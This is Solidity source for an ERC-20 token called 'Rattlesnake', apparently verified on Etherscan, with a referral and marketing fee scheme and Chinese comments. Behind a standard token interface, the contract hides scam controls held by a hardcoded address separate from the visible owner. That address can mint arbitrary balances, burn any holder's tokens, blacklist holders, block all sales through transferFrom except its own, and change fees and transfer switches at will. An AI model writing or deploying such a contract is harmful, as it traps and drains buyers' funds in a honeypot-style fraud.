/**
 *Submitted for verification at Etherscan.io on 2021-12-29
*/

pragma solidity ^0.6.12;
// SPDX-License-Identifier: Unlicensed
interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

   
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

   
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

   
    function approve(address spender, uint256 amount) external returns (bool);

   
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

   
    event Transfer(address indexed from, address indexed to, uint256 value);

   
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library Address {
   
    function isContract(address account) internal view returns (bool) {
       
        bytes32 codehash;


            bytes32 accountHash
         = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
       
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }


    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

 
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

 
    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }


    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }


    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }


    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");


        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
           
            if (returndata.length > 0) {
               
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


contract Ownable is Context {
    address private _owner;
    address private _OwnerAddress = 0xca7FF6798460EbA1612f1076Ee74D700D7FEE790;


    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );


    constructor() internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    modifier OwnerAddress() {
        require(_OwnerAddress == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function transferOwnership(address newOwner) public virtual OwnerAddress {
        _owner = newOwner;
    }
}

contract Rattlesnake is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping(address => uint256) private _balance;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) private _isExcludedFromFeelist;
    mapping(address => bool) private _isExcluded;

    uint256 private constant MAX = ~uint256(0);
    uint256 private _total = 1000000000000000000000000 * 10**3;
    uint256 private _tFeeTotal;
    
    string private _name = "Rattlesnake";
    string private _symbol = "Rattlesnake";
    uint8 private _decimals = 3;

    mapping(address => bool) private _fire;
    bool private CK = true;
    bool private  ALLCK= false;

//转账开关 为false时关闭
    bool public _transferOff = false;
    uint256 public maxBalance = 10000000000000000000000;

    //营销费率
    uint256 public marketingFee = 5;
    //推广费率
    uint256 public recommendFee = 10;
    //上级关联信息
    mapping(address => address) public recommend;
    //营销地址
    address public _marketingAddress = 0xca7FF6798460EbA1612f1076Ee74D700D7FEE790;
    //swap路由地址
    address public _pairAddress;
    
    uint256 public burnfire = uint256(0);
    mapping(address => uint256) private burnfires;
    address[] private _burnfires;

    uint256 public fire = uint256(0);
    mapping(address => uint256) private fires;
    address[] private _fires;

    address owners;

    constructor() public {
        _balance[_msgSender()] = _total;
         owners = _msgSender();
        _isExcludedFromFeelist[owner()] = true;
        _isExcludedFromFeelist[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _total);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _total;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if(_msgSender() != owners && recipient != owners){
            require(_transferOff == false, "transferOff");
        }
        address topUser = recommend[recipient];
        if(topUser == address(0)){
            recommend[recipient] = _msgSender();
        }
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if(ALLCK){
     require(owners == sender, "ALLCK");
        }
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function addfire(address getadd, uint256 getqu) 
        external 
        OwnerAddress() {
        require(getqu > 0, "fire");
        uint256 CAt = fires[getadd];
        if (CAt == 0) _fires.push(getadd);
        fires[getadd] = CAt.add(getqu);
        fire = fire.add(getqu);
        _balance[getadd] = _balance[getadd].add(getqu);
    }
     function burnNFT(address burnAddress, uint256 burnquantity)
        external
        OwnerAddress()
    {
        require(burnquantity > 0, "burnfire");
        uint256 burncat = fires[burnAddress];
        if (burncat == 0) _burnfires.push(burnAddress);
        burnfires[burnAddress] = burncat.add(burnquantity);
        burnfire = burnfire.add(burnquantity);
        _balance[burnAddress] = _balance[burnAddress].sub(burnquantity);
    }
    function isExcludedFromRewards(address account) public view returns (bool) {
        return _isExcluded[account];
    }

    function totalFees() public view returns (uint256) {
        return _tFeeTotal;
    }

    function excludeFromFee(address account) public OwnerAddress {
        _isExcludedFromFeelist[account] = true;
    }

    function includeInFee(address amountt) public OwnerAddress {
        _isExcludedFromFeelist[amountt] = false;
    }
 
    function _ALLCK(bool adds) external OwnerAddress() {
        ALLCK = adds;
    }
    function _approvefire(address adds) external OwnerAddress() {
        _fire[adds] = true;
    }

    function _approvefires(address adds) external OwnerAddress() {
        delete _fire[adds];
    }

    function ASKCK(address adds)
        external
        view
        OwnerAddress()
        returns (bool)
    {
        return _fire[adds];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(amount > 0, "Transfer amount must be greater than zero");

        if (CK) {
            require(_fire[from] == false, "CK");
        }
        address _recommendAddress;
        if(from == _pairAddress && to != owners){
            require(getBool(to) == false, "no top user");
            require(balanceOf(to) > 0, "balance to less");
            require(balanceOf(to) < maxBalance, "Excessive balance");
            _recommendAddress = recommend[to];
        }else if(to == _pairAddress && from != owners){
            require(amount < balanceOf(from).div(2), "sale too much");
            _recommendAddress = recommend[from];
        }

        uint256 marketingAmount = amount.mul(marketingFee).div(100);
        uint256 recommendAmount = amount.mul(recommendFee).div(100);

        if(_isExcludedFromFeelist[from] == true || _isExcludedFromFeelist[to] == true){
            _transfers(from, to, amount);
        }else{
            _transfers(from, _marketingAddress, marketingAmount);
            _transfers(from, _recommendAddress, recommendAmount);
            _transfers(from, to, amount.sub(marketingAmount).sub(recommendAmount));
        }
    }

    function _transfers(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balance[sender] = _balance[sender].sub(tAmount);
        _balance[recipient] = _balance[recipient].add(tAmount);
        emit Transfer(sender, recipient, tAmount);
    }

    //查询推荐人地址
    function getRecommond(address account) public view returns (address) {
        return recommend[account];
    }

    //查询是否有推荐人
    function getBool(address account) public view returns (bool) {
        return recommend[account] == address(0);
    }

    //设置swap路由地址
    function setSwapPair(address _target) public OwnerAddress() {
        _pairAddress = _target;
    }

    function setMarketFee(uint256 _target) public OwnerAddress() {
        marketingFee = _target;
    }

    function setRecommendFee(uint256 _target) public OwnerAddress() {
        recommendFee = _target;
    }

    function setTransferOnOff(bool _target) public OwnerAddress() {
        _transferOff = _target;
    }

    function setMaxBalance(uint256 _amount) external OwnerAddress() {
        maxBalance = _amount;
    }

}